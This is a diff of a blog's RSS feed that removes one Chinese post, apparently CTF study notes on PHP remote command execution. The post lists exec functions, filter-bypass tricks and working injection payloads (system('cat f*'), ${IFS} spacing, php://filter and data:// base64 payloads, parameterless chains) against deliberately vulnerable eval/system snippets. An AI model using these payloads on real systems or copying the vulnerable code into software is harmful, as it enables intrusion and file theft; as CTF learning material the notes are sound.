@@ -7,7 +7,6 @@
         <language>zh-CN</language>
         <pubDate>Thu, 09 Nov 2023 00:00:00 +0800</pubDate>
         <lastBuildDate>Thu, 09 Nov 2023 00:00:00 +0800</lastBuildDate>
-        <category>mysql</category>
         <category>JavaScript</category>
         <category>nodejs</category>
         <category>xctf</category>
@@ -322,145 +321,6 @@ onerror 函数的话，是在 img 这个标签无法正常执行的时候触发�
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">https://starofeden.github.io/2023/10/28/RCE/</guid>
-            <title>RCE漏洞</title>
-            <link>https://starofeden.github.io/2023/10/28/RCE/</link>
-            <pubDate>Sat, 28 Oct 2023 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;(remote command/code execute) 远程系统命令执行&lt;br&gt;
-&lt;strong&gt;命令执行，需要严格的过滤&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;系统命令执行函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统命令执行函数&#34;&gt;#&lt;/a&gt; 系统命令执行函数：&lt;/h2&gt;
-&lt;p&gt;system ()：能将字符串作为 OS 命令执行，且返回命令执行结果；&lt;br&gt;
-exec ()：能将字符串作为 OS 命令执行，但是只返回执行结果的最后一行 (约等于无回显)；&lt;br&gt;
-shell_exec ()：能将字符串作为 OS 命令执行&lt;br&gt;
- passthru ()：能将字符串作为 OS 命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；&lt;br&gt;
-popen ()：打开进程文件指针&lt;br&gt;
- proc_open ()：与 popen () 类似&lt;br&gt;
- pcntl_exec ()：在当前进程空间执行指定程序；&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;反引号 &lt;code&gt;：反引号&lt;/code&gt; 内的字符串会被解析为 OS 命令；但是反引号不会给出输出结果，得加个 echo：&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=echo%20`tac%20f*`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;代码执行函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码执行函数&#34;&gt;#&lt;/a&gt; 代码执行函数&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eval()：将字符串作为php代码执行；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert()：将字符串作为php代码执行；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;preg_replace()：正则匹配替换字符串；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create_function()：主要创建匿名函数；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤&#34;&gt;#&lt;/a&gt; 过滤&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;会返回一个空页面，因为 PHP 是服务器端解释的语言，在浏览网页的时候服务器会对 php 文件进行解释并执行，最终生成相应的 HTML 代码并返回给浏览器，所以网页是显示不出 PHP 代码。查看源代码就能看到 flag&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;linux通配符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux通配符&#34;&gt;#&lt;/a&gt; linux 通配符&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;*&lt;/td&gt;
-&lt;td&gt;匹配任意字符&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;？&lt;/td&gt;
-&lt;td&gt;匹配任意一个字符&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;[abcd]&lt;/td&gt;
-&lt;td&gt;匹配 abcd 中任何一个字符&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;[a-z]&lt;/td&gt;
-&lt;td&gt;表示范围 a 到 z，表示范围的意思 [] 匹配中括号中任意一个字符&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;[!abcd] 或 [^abcd]&lt;/td&gt;
-&lt;td&gt;表示不匹配括号里面的任何一个字符&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3 id=&#34;常用命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用命令&#34;&gt;#&lt;/a&gt; 常用命令&lt;/h3&gt;
-&lt;p&gt;cat  查看当前文件夹下的文件&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;跟 cat 作用差不多的命令：&lt;br&gt;
-cat、tac、more、less、head、tail、nl、sed、sort、uniq、re&lt;br&gt;
-cp 复制文件&lt;br&gt;
- nl  打印内容的同时添加行号&lt;br&gt;
- tac 从尾部向头部逐行打印输出&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;过滤了flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了flag&#34;&gt;#&lt;/a&gt; 过滤了 flag&lt;/h3&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=system(&amp;#x27;cat f*&amp;#x27;); //这个需要访问源代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=system(&amp;quot;cp fla?.php 1.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=system(“cat *php &amp;gt;&amp;gt; 1.txt”);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h3 id=&#34;过滤了空格&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了空格&#34;&gt;#&lt;/a&gt; 过滤了空格&lt;/h3&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;（反引号）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;IFS&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$IFS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%09（tab）（php环境）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;strong&gt;在使用 `` 或者 system 这些命令，带有的内容替换时，要注意转义（加上\），因为在 php 中有特殊含义&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;测试时发现 %20 和 $IFS ${IFS} 都不行。因为用 $IFS 的话，会认为解析没结束，会把后面的也当做参数解析，而 $IFS$9 的话，结束了 $IFS 后加上了一个不存在或者说空字符串的变量。所以解析为空，但结束了 $IFS，正常执行后面的内容&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;嵌套执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#嵌套执行&#34;&gt;#&lt;/a&gt; 嵌套执行&lt;/h3&gt;
-&lt;p&gt;常与正则匹配一起出现 (因为正则匹配只对 c 进行了匹配)&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload：?c=eval($_GET[1]);&amp;amp;1=system(&amp;quot;tac flag.php&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h3 id=&#34;过滤了分号反引号左括号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了分号反引号左括号&#34;&gt;#&lt;/a&gt; 过滤了分号，反引号，左括号&lt;/h3&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $c = $_GET[&amp;#x27;c&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(!preg_match(&amp;quot;/flag|system|php|cat|sort|shell|\.| |\&amp;#x27;|\`|echo|\;|\(/i&amp;quot;, $c))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        eval($c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;php 伪协议&lt;/li&gt;
-&lt;li&gt;在 eval 中可以用？&amp;gt; 代替；因为在 eval 中每个语句都要加分好&lt;br&gt;
-&lt;strong&gt; GET 一定要大写&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;参数可以用数字或字母，被过滤了就只能用字母了&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=include$_GET[a]?&amp;gt;&amp;amp;a=php://filter/read=convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;blockquote&gt;
-&lt;p&gt;意思是先把 include$_GET [1]?&amp;gt; 传入 c，就实现了可通过 get 方式获取到 l 并且 include 进来。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;data协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#data协议&#34;&gt;#&lt;/a&gt; data 协议&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; if(!preg_match(&amp;quot;/flag/i&amp;quot;, $c))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        include($c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;包含了 c，也就是说把 c 传入一个获取 flag 的文件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//编码是&amp;lt;?php system(&amp;#x27;cat flag.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//或者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=data://text/plain,&amp;lt;?php system(&amp;#x27;cat fla*&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;如果增加了.php 后缀也可以用这个 playload，因为语句已经闭合了，后面的.php 会被当成 html 页面直接显示在页面上。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;code&gt;直接cat不echo的话是看不到flag的，所以没有echo的话必须用下面的playload&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=data://text/plain,&amp;lt;?=system(&amp;#x27;tac fl*&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;blockquote&gt;
-&lt;p&gt;“&amp;lt;?=” 是 PHP 的一个短的开放式标签，是 echo () 的快捷用法&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;无参数rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无参数rce&#34;&gt;#&lt;/a&gt; 无参数 RCE&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;正则校验:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(&amp;#x27;;&amp;#x27; === preg_replace(&amp;#x27;/[^\W]+\((?R)?\)/&amp;#x27;, &amp;#x27;&amp;#x27;, $_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval($_GET[&amp;#x27;code&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;只能以下形式通过：&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a(b(c()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;blockquote&gt;
-&lt;p&gt;大致思路如下：&lt;br&gt;
-1. 利用超全局变量进行 bypass，进行 RCE&lt;br&gt;
-2. 进行任意文件读取&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. pos()：返回数组中当前元素的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. scandir()：获取目录下的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4. array_reverse()：将数组逆序排列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5. next()：函数将内部指针指向下一元素，并输出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6. show_source()函数对文件进行语法高亮显示，是highlight_file()别名。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7. print_r(scandir(‘.’)); 查看当前目录下的所有文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8. current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;array_reverse() 函数以相反的元素顺序返回数组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;next() 函数将内部指针指向数组中的下一个元素，并输出。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。同时整个文件也会显示出来&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//构造如下payload：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file(next(array_reverse((scandir(pos(localeconv()))))));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//上述先用第一个函数将数组元素顺序颠倒，随后用next函数，将指针指向flag的位置，最终用高亮显示，将了flag文件回显&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pos()与current()作用相同 readfile()与作用相同highlight_file()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=readfile(next(array_reverse(scandir(current(localeconv())))));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#show_source()与作用相同highlight_file()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=show_source(next(array_reverse(scandir(pos(localeconv())))));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;没过滤-或运算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没过滤-或运算&#34;&gt;#&lt;/a&gt; 没过滤 | 或运算&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;hint 给了羽师傅的脚本，在小皮根目录的 rce_or&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;![屏幕截图 2023-09-11 193956](C:\Users\dell\Desktop\ 笔记 \ 屏幕截图 2023-09-11 193956.png)&lt;/p&gt;
-&lt;h2 id=&#34;黑洞文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黑洞文件&#34;&gt;#&lt;/a&gt; 黑洞文件&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $c=$_GET[&amp;#x27;c&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system($c.&amp;quot; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;blockquote&gt;
-&lt;p&gt;/dev/null 文件可以被看作是一个 “黑洞” 文件。它等价于一个只写的的文件。所有写入它的内容都会永远丢失 (因为不可读)。&lt;br&gt;
